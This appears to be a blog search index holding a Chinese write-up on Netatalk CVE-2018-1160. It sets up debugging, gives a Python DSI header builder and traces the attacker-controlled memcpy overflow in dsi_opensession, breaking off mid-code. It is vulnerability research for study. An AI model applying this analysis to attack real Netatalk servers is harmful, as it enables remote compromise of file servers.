<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2018-1160</title>
      <link href="/2022/01/25/cve-2018-1160/"/>
      <url>/2022/01/25/cve-2018-1160/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>我做题的时候主要参考以下3篇wp，本文可以配合这3篇wp食用：</p><p><a href="https://gtrboy.github.io/posts/netatalk/">gtrboy</a></p><p><a href="https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/">ruan</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/">Clang裁缝店</a></p><h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>在ubuntu18.04下运行：</p><pre class="line-numbers language-none"><code class="language-none">$ LD_PRELOAD&#x3D;&quot;.&#x2F;libatalk.so.18&quot;  .&#x2F;afpd -d -F .&#x2F;afp.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由afp.conf可知，程序会监听5566端口：</p><pre class="line-numbers language-none"><code class="language-none">[Global]afp port &#x3D; 5566disconnect time &#x3D; 0max connections &#x3D; 1000sleep time &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ sudo netstat -pantu | grep 5566tcp6       0      0 :::5566                 :::*                    LISTEN      4037&#x2F;.&#x2F;afpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调试的时候直接attach进程号，而且由于我们攻击的是fork出来的子进程，所以需要让gdb跟进子进程：</p><pre class="line-numbers language-none"><code class="language-none">$ sudo gdb --pid 4037 -qpwndbg&gt; set follow-fork-mode child<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/">源码下载</a></p><p>我们主要关注 <code>/etc/afpd</code> 和 <code>/libatalk</code> 两个文件夹，前者是主体，后者是功能库。</p><h3 id="DSI"><a href="#DSI" class="headerlink" title="DSI"></a>DSI</h3><p>用户与afpd交互主要是通过<a href="https://en.wikipedia.org/wiki/Data_Stream_Interface">DSI</a>数据包，其格式如下：<br><a href="https://imgtu.com/i/77bjoj"><img src="https://s4.ax1x.com/2022/01/25/77bjoj.png" alt="DSI标准"></a><br>我们将Payload前面的部分称为Header，我们的Header如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token comment"># Flags: request(0)</span>    <span class="token comment"># 由于漏洞点位于 dsi_opensession，故 Command = 4</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span><span class="token comment"># Command: DSIOpenSession(4)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span><span class="token comment"># Request ID</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token comment"># Error code/ enclosed data offset: 0</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span><span class="token comment"># Total data length</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token comment"># Reserved</span>    <span class="token keyword">return</span> header<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DSI数据包发送给netatalk后，在main()函数中处理数据，用DSI结构体保存。可以看到，我们上面的Header其实就是保存在dsi_block结构体中的：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_BLOCKSIZ</span> <span class="token expression"><span class="token number">16</span></span></span><span class="token keyword">struct</span> <span class="token class-name">dsi_block</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">uint8_t</span> dsi_flags<span class="token punctuation">;</span>       <span class="token comment">/* packet type: request or reply */</span>    <span class="token keyword">uint8_t</span> dsi_command<span class="token punctuation">;</span>     <span class="token comment">/* command */</span>    <span class="token keyword">uint16_t</span> dsi_requestID<span class="token punctuation">;</span>  <span class="token comment">/* request ID */</span>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">uint32_t</span> dsi_code<span class="token punctuation">;</span>   <span class="token comment">/* error code */</span>        <span class="token keyword">uint32_t</span> dsi_doff<span class="token punctuation">;</span>   <span class="token comment">/* data offset */</span>    <span class="token punctuation">&#125;</span> dsi_data<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> dsi_len<span class="token punctuation">;</span>        <span class="token comment">/* total data length */</span>    <span class="token keyword">uint32_t</span> dsi_reserved<span class="token punctuation">;</span>   <span class="token comment">/* reserved field */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_DATASIZ</span>       <span class="token expression"><span class="token number">65536</span></span></span><span class="token comment">/* child and parent processes might interpret a couple of these * differently. */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>             <span class="token comment">/* multiple listening addresses */</span>    AFPObj   <span class="token operator">*</span>AFPobj<span class="token punctuation">;</span>    <span class="token keyword">int</span>      statuslen<span class="token punctuation">;</span>    <span class="token keyword">char</span>     status<span class="token punctuation">[</span><span class="token number">1400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>signature<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">dsi_block</span>        header<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_storage</span> server<span class="token punctuation">,</span> client<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">itimerval</span>        timer<span class="token punctuation">;</span>    <span class="token keyword">int</span>      tickle<span class="token punctuation">;</span>            <span class="token comment">/* tickle count */</span>    <span class="token keyword">int</span>      in_write<span class="token punctuation">;</span>          <span class="token comment">/* in the middle of writing multiple packets,                                   signal handlers can't write to the socket */</span>    <span class="token keyword">int</span>      msg_request<span class="token punctuation">;</span>       <span class="token comment">/* pending message to the client */</span>    <span class="token keyword">int</span>      down_request<span class="token punctuation">;</span>      <span class="token comment">/* pending SIGUSR1 down in 5 mn */</span>    <span class="token keyword">uint32_t</span> attn_quantum<span class="token punctuation">,</span> datasize<span class="token punctuation">,</span> server_quantum<span class="token punctuation">;</span>    <span class="token keyword">uint16_t</span> serverID<span class="token punctuation">,</span> clientID<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span> <span class="token comment">/* DSI recieve buffer */</span>    <span class="token keyword">uint8_t</span>  data<span class="token punctuation">[</span>DSI_DATASIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* DSI reply buffer */</span>    size_t   datalen<span class="token punctuation">,</span> cmdlen<span class="token punctuation">;</span>    off_t    read_count<span class="token punctuation">,</span> write_count<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> flags<span class="token punctuation">;</span>             <span class="token comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span>    <span class="token keyword">int</span>      socket<span class="token punctuation">;</span>            <span class="token comment">/* AFP session socket */</span>    <span class="token keyword">int</span>      serversock<span class="token punctuation">;</span>        <span class="token comment">/* listening socket */</span>    <span class="token comment">/* DSI readahead buffer used for buffered reads in dsi_peek */</span>    size_t   dsireadbuf<span class="token punctuation">;</span>        <span class="token comment">/* size of the DSI readahead buffer used in dsi_peek() */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>buffer<span class="token punctuation">;</span>           <span class="token comment">/* buffer start */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>start<span class="token punctuation">;</span>            <span class="token comment">/* current buffer head */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>eof<span class="token punctuation">;</span>              <span class="token comment">/* end of currently used buffer */</span>    <span class="token keyword">char</span>     <span class="token operator">*</span>end<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">USE_ZEROCONF</span></span>    <span class="token keyword">char</span> <span class="token operator">*</span>bonjourname<span class="token punctuation">;</span>      <span class="token comment">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span>    <span class="token keyword">int</span> zeroconf_registered<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token comment">/* protocol specific open/close, send/receive     * send/receive fill in the header and use dsi->commands.     * write/read just write/read data */</span>    <span class="token function">pid_t</span>  <span class="token punctuation">(</span><span class="token operator">*</span>proto_open<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span>   <span class="token punctuation">(</span><span class="token operator">*</span>proto_close<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> DSI<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>总结：<code>main() -&gt; dsi_start() -&gt; dis_getsession() -&gt; dsi_opensession(): memcpy()</code></p><ul><li><p>main()(@/etc/afpd/main.c)：main()函数先进行一系列初始化工作，包括解析配置文件，初始化socket、初始化dsi结构体等，之后调用dsi_start()函数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> ac<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> asev<span class="token operator">-></span>used<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>asev<span class="token operator">-></span>fdset<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> <span class="token punctuation">(</span>POLLIN <span class="token operator">|</span> POLLERR <span class="token operator">|</span> POLLHUP <span class="token operator">|</span> POLLNVAL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">switch</span> <span class="token punctuation">(</span>asev<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>fdtype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">case</span> LISTEN_FD<span class="token operator">:</span>    <span class="token comment">/**************************************************    main() -> dis_start()    **************************************************/</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>child <span class="token operator">=</span> <span class="token function">dsi_start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>obj<span class="token punctuation">,</span> <span class="token punctuation">(</span>DSI <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>asev<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">private</span><span class="token punctuation">)</span><span class="token punctuation">,</span> server_children<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">asev_add_fd</span><span class="token punctuation">(</span>asev<span class="token punctuation">,</span> child<span class="token operator">-></span>afpch_ipc_fd<span class="token punctuation">,</span> IPC_FD<span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"out of asev slots"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">/*                             * Close IPC fd here and mark it as unused                             */</span>                            <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token operator">-></span>afpch_ipc_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>                            child<span class="token operator">-></span>afpch_ipc_fd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token comment">/*                             * Being unfriendly here, but we really                             * want to get rid of it. The 'child'                             * handle gets cleaned up in the SIGCLD                             * handler.                             */</span>                            <span class="token function">kill</span><span class="token punctuation">(</span>child<span class="token operator">-></span>afpch_pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dsi_start()(@/etc/afpd/main.c)：dsi_start()函数先调用dsi_getsession()函数获取TCP会话，解析请求消息，之后调用afp_over_dsi()函数进行会话内容的处理。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> afp_child_t <span class="token operator">*</span><span class="token function">dsi_start</span><span class="token punctuation">(</span>AFPObj <span class="token operator">*</span>obj<span class="token punctuation">,</span> DSI <span class="token operator">*</span>dsi<span class="token punctuation">,</span> server_child_t <span class="token operator">*</span>server_children<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    afp_child_t <span class="token operator">*</span>child <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_getsession</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> server_children<span class="token punctuation">,</span> obj<span class="token operator">-></span>options<span class="token punctuation">.</span>tickleval<span class="token punctuation">,</span> <span class="token operator">&amp;</span>child<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"dsi_start: session error: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* we've forked. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">configfree</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">afp_over_dsi</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* start a session */</span>        <span class="token function">exit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> child<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dis_getsession()(@/libatalk/dsi/dsi_getsess.c)：dis_getsession()函数开启一个DSI会话，从TCP socket接收会话消息，保存至结构体DSI中。 函数首先调用dsi-&gt;proto_open(dsi)进行TCP消息的接收和处理，该函数实体为dsi_tcp_open()。根据返回值是父进程还是子进程，进入不同的处理逻辑。父进程则直接返回，继续监听；子进程则进入之后的DSI消息处理逻辑，根据dsi_command的值（下面在结构体中介绍），选择不同的处理方式，若dsi_command为DSIFUNC_OPEN，则调用dsi_opensession()函数，初始化DSI会话。其中，dsi_tcp_open()将接收的数据保存至DSI结构体中。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dsi_getsession</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">,</span> server_child_t <span class="token operator">*</span>serv_children<span class="token punctuation">,</span> <span class="token keyword">int</span> tickleval<span class="token punctuation">,</span> afp_child_t <span class="token operator">*</span><span class="token operator">*</span>childp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>pid <span class="token operator">=</span> dsi<span class="token operator">-></span><span class="token function">proto_open</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* in libatalk/dsi/dsi_tcp.c */</span>  <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span>    <span class="token comment">/* if we fail, just return. it might work later */</span>    <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_getsess: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token comment">/* child. mostly handled below. */</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span> <span class="token comment">/* parent */</span>    <span class="token comment">/* using SIGKILL is hokey, but the child might not have     * re-established its signal handler for SIGTERM yet. */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    dsi<span class="token operator">-></span><span class="token function">proto_close</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>childp <span class="token operator">=</span> child<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> DSIFUNC_STAT<span class="token operator">:</span> <span class="token comment">/* send off status and return */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">case</span> DSIFUNC_OPEN<span class="token operator">:</span> <span class="token comment">/* setup session */</span>    <span class="token comment">/* set up the tickle timer */</span>    dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_interval<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> tickleval<span class="token punctuation">;</span>    dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_interval<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> dsi<span class="token operator">-></span>timer<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">dsi_opensession</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>childp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span> <span class="token comment">/* just close */</span>    <span class="token function">LOG</span><span class="token punctuation">(</span>log_info<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"DSIUnknown %d"</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command<span class="token punctuation">)</span><span class="token punctuation">;</span>    dsi<span class="token operator">-></span><span class="token function">proto_close</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLNT<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>dsi_opensession()(@/libatalk/dsi/dsi_opensess.c)：dsi_opensession()函数首先根据commands[0]的内容决定处理逻辑，若为DSIOPT_ATTNQUANT，则执行memcpy，以commands[1]为大小，将commands[2]之后的内容拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。之后程序会构建新的DSI消息到dsi-&gt;commands中， <strong>将server_quantum的值返回给客户端</strong> 。漏洞点在 <code>memcpy(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + 1, dsi-&gt;commands[i])</code> ，这里的 dsi-&gt;commands 就是DSI数据包结构中的Payload，解析结构为 <code>dsi-&gt;commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n byte)</code>。程序开发者本意是想拷贝4个字节内容至dsi-&gt;attn_quantum变量，但是由于Payload是可控的，故memcpy长度可由攻击者定义（commands[1]，最大值为255），因此攻击者可以覆盖attn_quantum之后变量的内容（包括datasize，server_quantum，serverID，clientID，*commands和部分的data）。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">pedef <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">uint32_t</span> attn_quantum<span class="token punctuation">,</span> datasize<span class="token punctuation">,</span> server_quantum<span class="token punctuation">;</span>    <span class="token keyword">uint16_t</span> serverID<span class="token punctuation">,</span> clientID<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span> <span class="token comment">/* DSI recieve buffer */</span>    <span class="token keyword">uint8_t</span>  data<span class="token punctuation">[</span>DSI_DATASIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* DSI reply buffer */</span>    size_t   datalen<span class="token punctuation">,</span> cmdlen<span class="token punctuation">;</span>    off_t    read_count<span class="token punctuation">,</span> write_count<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span> DSI<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dsi_opensession</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">uint32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">/* this serves double duty. it must be 4-bytes long */</span>  <span class="token keyword">int</span> offs<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">/* parse options */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/*    * 结合这里的可知 Payload 的内部结构为：    * dsi->commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n byte)    */</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> DSIOPT_ATTNQUANT<span class="token operator">:</span>      <span class="token comment">// 漏洞点</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>attn_quantum<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dsi<span class="token operator">-></span>attn_quantum <span class="token operator">=</span> <span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>attn_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> DSIOPT_SERVQUANT<span class="token operator">:</span> <span class="token comment">/* just ignore these */</span>    <span class="token keyword">default</span><span class="token operator">:</span>      i <span class="token operator">+=</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">/* forward past length tag + length */</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* let the client know the server quantum. we don't use the   * max server quantum due to a bug in appleshare client 3.8.6. */</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> DSIFL_REPLY<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* dsi->header.dsi_command = DSIFUNC_OPEN;*/</span>  dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* length of data. dsi_send uses it. */</span>  <span class="token comment">/* DSI Option Server Request Quantum */</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> DSIOPT_SERVQUANT<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token punctuation">(</span> dsi<span class="token operator">-></span>server_quantum <span class="token operator">&lt;</span> DSI_SERVQUANT_MIN <span class="token operator">||</span>       dsi<span class="token operator">-></span>server_quantum <span class="token operator">></span> DSI_SERVQUANT_MAX <span class="token punctuation">)</span> <span class="token operator">?</span>     